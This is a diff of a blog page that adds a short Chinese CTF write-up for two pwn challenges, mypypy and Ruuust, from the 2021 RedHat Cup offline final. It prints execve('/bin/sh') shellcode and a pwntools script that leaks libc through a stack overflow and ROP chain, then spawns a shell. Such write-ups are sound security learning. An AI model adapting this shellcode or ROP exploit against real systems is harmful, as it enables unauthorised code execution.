@@ -96,16 +96,18 @@
 
 
 
-  <meta name="description" content="Personal Blog">
-<meta property="og:type" content="website">
-<meta property="og:title" content="无花果">
-<meta property="og:url" content="https://ainevsia.github.io/archives/2018/05/index.html">
+  <meta name="description" content="比赛的时候一道题都没做出来，哭了，我真的太菜了。回来复盘了两道pwn题：mypypy和Ruuust，简单记录一下。">
+<meta name="keywords" content="CTF Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2021 第四届红帽杯线下 pwn writeup">
+<meta property="og:url" content="https://ainevsia.github.io/2021/07/29/2021RedHatCTF-offline/index.html">
 <meta property="og:site_name" content="无花果">
-<meta property="og:description" content="Personal Blog">
+<meta property="og:description" content="比赛的时候一道题都没做出来，哭了，我真的太菜了。回来复盘了两道pwn题：mypypy和Ruuust，简单记录一下。">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-07-29T11:33:33.288Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="无花果">
-<meta name="twitter:description" content="Personal Blog">
+<meta name="twitter:title" content="2021 第四届红帽杯线下 pwn writeup">
+<meta name="twitter:description" content="比赛的时候一道题都没做出来，哭了，我真的太菜了。回来复盘了两道pwn题：mypypy和Ruuust，简单记录一下。">
 
 
 
@@ -114,7 +116,7 @@
 
 
 
-  <link rel="canonical" href="https://ainevsia.github.io/archives/2018/05/">
+  <link rel="canonical" href="https://ainevsia.github.io/2021/07/29/2021RedHatCTF-offline/">
 
 
 
@@ -124,7 +126,7 @@
   };
 </script>
 
-  <title>归档 | 无花果</title>
+  <title>2021 第四届红帽杯线下 pwn writeup | 无花果</title>
   
 
 
@@ -172,7 +174,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -282,7 +284,7 @@
         
         
           
-          <li class="menu-item menu-item-archives menu-item-active">
+          <li class="menu-item menu-item-archives">
 
     
     
@@ -362,103 +364,259 @@
           
             
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
           
           <div id="content" class="content">
             
 
+  <div id="posts" class="posts-expand">
+    
+
+  
+
   
   
   
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
 
-      
-      <span class="archive-page-counter">
-        
-        
-         
-        
-        还行! 目前共计 49 篇日志。 继续努力。
-      </span>
-      
-
-      
-
-        
-        
-        
-
-        
-          
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2018">2018</h1>
-          </div>
-        
-        
-
-        
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ainevsia.github.io/2021/07/29/2021RedHatCTF-offline/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ainevsia">
+      <meta itemprop="description" content="Personal Blog">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/31178818?s=400&u=04fe60fc9fd9e159806f4c2363ab9a4da748bf84&v=4">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="无花果">
+    </span>
+
+    
+      <header class="post-header">
+
         
-          <a class="post-title-link" href="/2018/05/07/PAT-A-1051/" itemprop="url">
-            
-              <span itemprop="name">PAT-A-1051</span>
-            
-          </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">2021 第四届红帽杯线下 pwn writeup
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2018-05-07T19:52:55+08:00" content="2018年05月07日">
-          05-07
-        </time>
-      </div>
+              
+            
+          </h1>
+        
 
-    </header>
-  </article>
+        <div class="post-meta">
+          <span class="post-time">
 
+            
+            
+            
 
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2021年07月29日 19:16:26 / 修改时间：19:33:33" itemprop="dateCreated datePublished" datetime="2021-07-29T19:16:26+08:00">2021年07月29日</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">评论数：</span>
+                <a href="/2021/07/29/2021RedHatCTF-offline/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/07/29/2021RedHatCTF-offline/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="post-meta-item-icon">
+            <i class="fa fa-eye"></i>
+             阅读次数： 
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
+
+          
+            <div class="post-symbolscount">
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文字数：</span>
+                
+                <span title="本文字数">2.2k</span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">2 分钟</span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
+      
 
+      
+        <p>比赛的时候一道题都没做出来，哭了，我真的太菜了。回来复盘了两道pwn题：mypypy和Ruuust，简单记录一下。</p>
+<a id="more"></a>
+<h1 id="mypypy"><a href="#mypypy" class="headerlink" title="mypypy"></a>mypypy</h1><p>两题都不是常见pwn，刚拿到手有点懵，随便试了一些输入，发现是把python的语法给编译成了asm。</p>
+<p>然后仔细地看他是怎么翻译的，首先扫描一遍整个函数中所有出现的变量名，如果函数中有数组的话，就加一个位置存放数组个数，数组变量可以使用加法赋给另一个变量造成数组溢出，可以实现栈上任意数据读和任意数据写。</p>
+<p>然后想到的是可以利用libffi中的gadget做rop调用mprotect将栈上的shellcode设为可执行后跳shellcode，但是还是比较复杂的。</p>
+<p>回来以后发现如果出现字符串常量，会出现命令拼接的问题，可以直接拼接shellcode。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">'''1</span></span><br><span class="line"><span class="string">        push 0x68</span></span><br><span class="line"><span class="string">        mov rax, 0x732f2f2f6e69622f</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        push 0x1016972</span></span><br><span class="line"><span class="string">        xor dword ptr [rsp], 0x1010101</span></span><br><span class="line"><span class="string">        xor esi, esi</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        push 8</span></span><br><span class="line"><span class="string">        pop rsi</span></span><br><span class="line"><span class="string">        add rsi, rsp</span></span><br><span class="line"><span class="string">        push rsi</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        xor edx, edx</span></span><br><span class="line"><span class="string">        push 0x3b</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">END</span><br></pre></td></tr></table></figure>
+<h1 id="Ruuust"><a href="#Ruuust" class="headerlink" title="Ruuust"></a>Ruuust</h1><p>去符号的rust程序，看了10分钟就不想看了，觉得自己肯定是看不懂的。手动玩了一会也不知道会是什么洞，就放弃了。</p>
+<p>回来后动态调试了一下。发现menu是用一个独立的线程打印出来的，主循环是用另外一个线程执行的，不知道这是Rust的特性还是啥的。</p>
+<p>发现3选项Talk with me直接是往栈上读的，比赛的时候还以为是malloc的。往栈上读可以溢出。</p>
+<p>题目转化为无canary的栈溢出，第一轮leak libc，第二轮跳one gadget。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.terminal=[<span class="string">'tmux'</span>,<span class="string">'split-w'</span>,<span class="string">'-h'</span>]</span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">'./Ruuuuust'</span>,env=&#123;&#125;)</span><br><span class="line">p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'23339999'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'gift: '</span>)</span><br><span class="line">code=int(p.recvline().rstrip(),<span class="number">0x10</span>)-(<span class="number">0x555555591758</span><span class="number">-0x555555554000</span>)</span><br><span class="line">print(hex(code))</span><br><span class="line">pop_rdx=code+<span class="number">0x0000000000017f73</span></span><br><span class="line">pop_rdi=code+<span class="number">0x00000000000061de</span></span><br><span class="line">pop_rsi=code+<span class="number">0x00000000000062a7</span></span><br><span class="line">pop_rax=code+<span class="number">0x0000000000007c06</span></span><br><span class="line">write=code+<span class="number">0x24F05</span></span><br><span class="line">read=code+<span class="number">0x7DD0</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Size: '</span>,str(<span class="number">0xf8</span>))</span><br><span class="line">pay=(<span class="string">b'x'</span>*<span class="number">0x88</span>+p64(code+<span class="number">0x5555555a3000</span><span class="number">-0x555555554000</span>)).ljust(<span class="number">0xb8</span>,<span class="string">b'x'</span>)</span><br><span class="line">pay+=flat([pop_rdx,code+<span class="number">0x4EAA8</span>,pop_rax,<span class="number">8</span>,write,<span class="number">0xdeadbeef</span>,code+<span class="number">0x7C11</span>])</span><br><span class="line">p.sendafter(<span class="string">'say: '</span>,pay)</span><br><span class="line"><span class="comment"># attach(p,'b *$rebase(0x8363)\nc')</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'5'</span>)</span><br><span class="line">base=u64(p.recvn(<span class="number">8</span>))-(<span class="number">0x7ffff72bcaf0</span><span class="number">-0x7ffff71a1000</span>)</span><br><span class="line">one=base+<span class="number">0x10a45c</span>    <span class="comment"># 0x4f365 0x4f3c2 0x10a45c</span></span><br><span class="line">print(hex(base))</span><br><span class="line">p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Size: '</span>,str(<span class="number">0xf8</span>))</span><br><span class="line">pay=(<span class="string">b'x'</span>*<span class="number">0x88</span>+p64(code+<span class="number">0x5555555a3000</span><span class="number">-0x555555554000</span>)).ljust(<span class="number">0xb8</span>,<span class="string">b'x'</span>)</span><br><span class="line">pop2=code+<span class="number">0x0000000000006b89</span></span><br><span class="line">pop1=code+<span class="number">0x00000000000061de</span></span><br><span class="line">pay+=flat([pop1,<span class="number">0</span>,one])</span><br><span class="line">p.sendafter(<span class="string">'say: '</span>,pay)</span><br><span class="line"><span class="comment"># attach(p,'b *$rebase(0x8363)\nc')</span></span><br><span class="line">p.sendlineafter(<span class="string">'Choice: '</span>,<span class="string">'5'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+      
     </div>
+
+    
+
+    
+    
+    
+
+    <div>    
+    
+      
+        <ul class="post-copyright">
+          <li class="post-copyright-author">
+              <strong>本文作者：</strong>Ainevsia
+          </li>
+          <li class="post-copyright-link">
+            <strong>本文链接：</strong>
+            <a href="/2021/07/29/2021RedHatCTF-offline/" title="2021 第四届红帽杯线下 pwn writeup">https://ainevsia.github.io/2021/07/29/2021RedHatCTF-offline/</a>
+          </li>
+          <li class="post-copyright-license">
+            <strong>版权声明： </strong>
+            本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0 CN</a> 许可协议。转载请注明出处！
+          </li>
+        </ul>
+      
+    </div>
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF-Pwn/" rel="tag"># CTF Pwn</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/06/01/BitOperation/" rel="next" title="比特操作判断4字节DWORD中是否含有零字节">
+                <i class="fa fa-chevron-left"></i> 比特操作判断4字节DWORD中是否含有零字节
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+
+  
+
+
 
         </div>
         
@@ -479,8 +637,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -717,6 +884,23 @@
       </div>
 
       
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mypypy"><span class="nav-number">1.</span> <span class="nav-text">mypypy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Ruuust"><span class="nav-number">2.</span> <span class="nav-text">Ruuust</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
 
       
 
@@ -894,6 +1078,10 @@
 
 
   
+  <script src="/js/src/scrollspy.js?v=7.0.0"></script>
+<script src="/js/src/post-details.js?v=7.0.0"></script>
+
+
 
   
 
@@ -933,6 +1121,8 @@
 
 
 
+
+  
 
 
   
